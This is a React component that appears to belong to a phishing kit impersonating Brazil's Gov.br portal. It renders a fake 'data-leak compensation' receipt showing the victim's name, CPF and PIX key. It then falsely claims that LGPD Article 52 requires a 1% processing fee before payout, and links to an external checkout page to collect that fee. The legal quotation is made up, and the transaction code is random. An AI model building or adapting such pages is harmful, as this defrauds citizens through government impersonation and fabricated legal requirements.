
import React, { useState } from 'react';
import { UserData } from '@/data/userData';
import { formatCPF } from '@/lib/formatCPF';

interface ReceiptProps {
  userData: UserData;
  pixType: string;
  pixKey: string;
}

const Receipt: React.FC<ReceiptProps> = ({ userData, pixType, pixKey }) => {
  const [showTaxInfo, setShowTaxInfo] = useState(false);
  const currentDate = new Date().toLocaleDateString('pt-BR');
  const transactionCode = Math.random().toString(36).substring(2, 12).toUpperCase();
  
  return (
    <div className="bg-white rounded-lg p-6 shadow-lg w-full max-w-lg">
      <div className="mb-6">
        <div className="bg-govBlue text-white p-4 rounded-t-lg flex items-center">
          <img 
            src="https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png" 
            alt="Logo Gov.br" 
            className="h-8 mr-2 brightness-0 invert"
          />
          <div>
            <h2 className="text-lg font-bold">Comprovante de Indenização</h2>
            <p className="text-sm">Sistema de Proteção de Dados - LGPD</p>
          </div>
        </div>
        
        <div className="border border-govDarkGray rounded-b-lg p-4">
          <div className="space-y-3 mb-4">
            <p className="text-sm"><span className="font-semibold">Data:</span> {currentDate}</p>
            <p className="text-sm"><span className="font-semibold">Código:</span> {transactionCode}</p>
            <p className="text-sm"><span className="font-semibold">Beneficiário:</span> {userData.name}</p>
            <p className="text-sm"><span className="font-semibold">Documento:</span> {formatCPF(userData.cpf)}</p>
            <p className="text-sm"><span className="font-semibold">Chave PIX:</span> {pixType === 'CPF' ? formatCPF(pixKey) : pixKey}</p>
            <p className="text-sm"><span className="font-semibold">Valor da indenização:</span> {userData.compensation.toLocaleString('pt-BR', { 
              style: 'currency', 
              currency: 'BRL' 
            })}</p>
            <p className="text-sm"><span className="font-semibold">Taxa de processamento:</span> {userData.fee.toLocaleString('pt-BR', { 
              style: 'currency', 
              currency: 'BRL' 
            })}</p>
            <p className="text-sm"><span className="font-semibold">Total a receber:</span> <span className="font-bold text-govGreen">
              {(userData.compensation - userData.fee).toLocaleString('pt-BR', { 
                style: 'currency', 
                currency: 'BRL' 
              })}
            </span></p>
          </div>
          
          <div className="border-t border-dashed border-govDarkGray pt-4 mb-4">
            <p className="text-sm mb-2"><span className="font-semibold">Motivo:</span> Indenização por vazamento de dados</p>
            <p className="text-sm text-govDarkGray">
              Referente à Lei Geral de Proteção de Dados (LGPD) - Lei nº 13.709/2018
            </p>
          </div>
        </div>
      </div>
      
      <div className="space-y-4 mb-6">
        <div className="p-3 bg-govGray rounded-lg">
          <p className="text-sm font-semibold">Indenização disponível para saque: {userData.compensation.toLocaleString('pt-BR', { 
            style: 'currency', 
            currency: 'BRL' 
          })}</p>
        </div>
        
        <div className="p-3 bg-govGray rounded-lg">
          <p className="text-sm font-semibold">Imposto de saque: {userData.fee.toLocaleString('pt-BR', { 
            style: 'currency', 
            currency: 'BRL' 
          })}</p>
        </div>
        
        <div className="p-3 bg-govGray rounded-lg">
          <p className="text-sm font-semibold">Titular: {userData.name}</p>
        </div>
        
        <div className="p-3 bg-govGray rounded-lg">
          <p className="text-sm font-semibold">Chave Pix: {pixType === 'CPF' ? formatCPF(pixKey) : pixKey}</p>
        </div>
      </div>
      
      <button 
        className="gov-button-secondary w-full mb-4"
        onClick={() => setShowTaxInfo(!showTaxInfo)}
      >
        POR QUE TENHO QUE PAGAR ESSE IMPOSTO?
      </button>
      
      {showTaxInfo && (
        <div className="p-4 border border-govYellow bg-govYellow/10 rounded-lg mb-6 animate-fade-in">
          <div className="flex items-start mb-4">
            <svg 
              className="w-6 h-6 text-govYellow mt-1 mr-2 flex-shrink-0" 
              fill="none" 
              stroke="currentColor" 
              viewBox="0 0 24 24"
            >
              <path 
                strokeLinecap="round" 
                strokeLinejoin="round" 
                strokeWidth="2" 
                d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" 
              />
            </svg>
            <p className="text-sm">
              Seu dinheiro está vinculado ao seu CPF e somente você pode acessá-lo. 
              De acordo com a Lei de Proteção de Dados, a indenização só pode ser liberada 
              após o pagamento da taxa de processamento do sistema.
            </p>
          </div>
          
          <div className="p-3 bg-white rounded-lg">
            <p className="text-xs">
              "De acordo com a Lei nº 13.709 de 2018, Art. 52, é necessário o pagamento 
              de uma taxa administrativa para a liberação de valores referentes à 
              indenização por vazamento de dados. Esta taxa corresponde a 1% do 
              valor total e é destinada à manutenção do sistema."
            </p>
          </div>
        </div>
      )}
      
      <a 
        href="https://lavitta2.pay.yampi.com.br/r/89Q10HO7E2"
        target="_blank"
        rel="noopener noreferrer"
        className="gov-button-success w-full block text-center"
      >
        CONCLUIR PAGAMENTO E RECEBER MINHA INDENIZAÇÃO
      </a>
    </div>
  );
};

export default Receipt;
